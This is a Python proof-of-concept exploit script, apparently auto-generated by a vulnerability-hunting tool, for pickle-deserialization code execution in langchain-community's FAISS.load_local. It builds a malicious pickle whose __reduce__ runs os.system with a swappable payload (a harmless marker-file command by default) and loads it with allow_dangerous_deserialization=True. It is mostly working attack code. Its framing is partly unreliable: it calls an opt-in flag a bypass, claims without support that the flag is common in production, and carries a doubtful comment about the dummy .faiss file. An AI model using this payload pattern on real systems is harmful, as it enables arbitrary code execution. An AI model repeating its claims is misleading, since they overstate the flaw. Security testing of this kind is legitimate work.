#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_24.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only FAISS vectorstore.

Vulnerability: The load_local function uses pickle.load() on attacker-controlled file paths.
The allow_dangerous_deserialization flag only checks a boolean - if True, no further validation
is performed on the data source. An attacker who controls folder_path can point to a malicious
pickle file, achieving arbitrary code execution when the flag is set to True (common in production).

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with the attacker-controlled path and allow_dangerous_deserialization=True
3. Showing that arbitrary code execution occurs

Usage: python3 poc_exploit.py [target_path]
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration - modify these as needed
TARGET_PATH = sys.argv[1] if len(sys.argv) > 1 else "/tmp/exploit_test"
MALICIOUS_INDEX_NAME = "exploit_index"
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"  # Safe by default - creates a marker file

def create_malicious_pickle(output_dir: str, index_name: str) -> str:
    """
    Create a malicious pickle file that executes arbitrary code when deserialized.
    
    The pickle file will contain a __reduce__ method that executes our payload
    when pickle.load() is called on it.
    
    Args:
        output_dir: Directory to write the pickle file
        index_name: Name for the index file (will be {index_name}.pkl)
    
    Returns:
        Path to the created pickle file
    """
    # Ensure output directory exists
    os.makedirs(output_dir, exist_ok=True)
    
    pickle_path = os.path.join(output_dir, f"{index_name}.pkl")
    
    class MaliciousPickle:
        """Class that executes arbitrary code when unpickled."""
        
        def __reduce__(self):
            # This method is called during unpickling
            # It returns a tuple (callable, args) that gets executed
            return (os.system, (BENIGN_PAYLOAD,))
    
    # Create the malicious pickle
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file at: {pickle_path}")
    print(f"[+] Payload: {BENIGN_PAYLOAD}")
    
    return pickle_path

def simulate_exploit(target_path: str, index_name: str):
    """
    Simulate the exploit by calling load_local with attacker-controlled parameters.
    
    In a real attack, the attacker would:
    1. Host the malicious pickle file on a server they control
    2. Make the victim's application call load_local with folder_path pointing to their server
    3. The victim must have allow_dangerous_deserialization=True (common in production)
    
    Args:
        target_path: Path containing the malicious pickle file
        index_name: Name of the index to load
    """
    # Import the vulnerable function
    # Note: In a real exploit, this would be imported from the actual library
    # For this PoC, we simulate the vulnerable code path
    from langchain_community.vectorstores.faiss import FAISS
    
    # The vulnerable code path (simplified from the actual source):
    # path = Path(folder_path)
    # with open(path / f"{index_name}.pkl", "rb") as f:
    #     docstore, index_to_docstore_id = pickle.load(f)
    
    print(f"\n[*] Attempting exploit with:")
    print(f"    folder_path: {target_path}")
    print(f"    index_name: {index_name}")
    print(f"    allow_dangerous_deserialization: True")
    
    try:
        # This call will trigger the malicious pickle deserialization
        # The allow_dangerous_deserialization=True bypasses the only guard
        result = FAISS.load_local(
            folder_path=target_path,
            embeddings=None,  # Not needed for the exploit
            index_name=index_name,
            allow_dangerous_deserialization=True  # The critical flag
        )
        print(f"[!] load_local returned: {result}")
    except Exception as e:
        print(f"[!] Exception during load_local: {e}")
        # The exploit may still have executed before the exception
        # (e.g., if the pickle file is malformed but code execution already happened)

def verify_exploit():
    """Check if the payload was executed successfully."""
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"\n[+] EXPLOIT SUCCESSFUL! Marker file created: {marker_file}")
        print("[+] Arbitrary code execution achieved via malicious pickle deserialization")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("\n[-] Exploit may not have executed - marker file not found")
        return False

def main():
    """Main exploit demonstration."""
    print("=" * 60)
    print("PoC: RCE via pickle deserialization in langchain-community FAISS")
    print("=" * 60)
    
    # Step 1: Create the malicious pickle file
    print("\n[*] Step 1: Creating malicious pickle file...")
    pickle_path = create_malicious_pickle(TARGET_PATH, MALICIOUS_INDEX_NAME)
    
    # Also create a dummy .faiss file to satisfy the code path
    # (the exploit happens before the .faiss file is needed)
    dummy_faiss_path = os.path.join(TARGET_PATH, f"{MALICIOUS_INDEX_NAME}.faiss")
    with open(dummy_faiss_path, "w") as f:
        f.write("dummy")
    
    # Step 2: Attempt the exploit
    print("\n[*] Step 2: Attempting exploit via load_local...")
    simulate_exploit(TARGET_PATH, MALICIOUS_INDEX_NAME)
    
    # Step 3: Verify the exploit
    print("\n[*] Step 3: Verifying exploit...")
    verify_exploit()
    
    # Cleanup
    print("\n[*] Cleaning up...")
    if os.path.exists(pickle_path):
        os.remove(pickle_path)
    if os.path.exists(dummy_faiss_path):
        os.remove(dummy_faiss_path)
    if os.path.exists(TARGET_PATH):
        os.rmdir(TARGET_PATH)
    
    print("\n[*] PoC completed.")

if __name__ == "__main__":
    main()
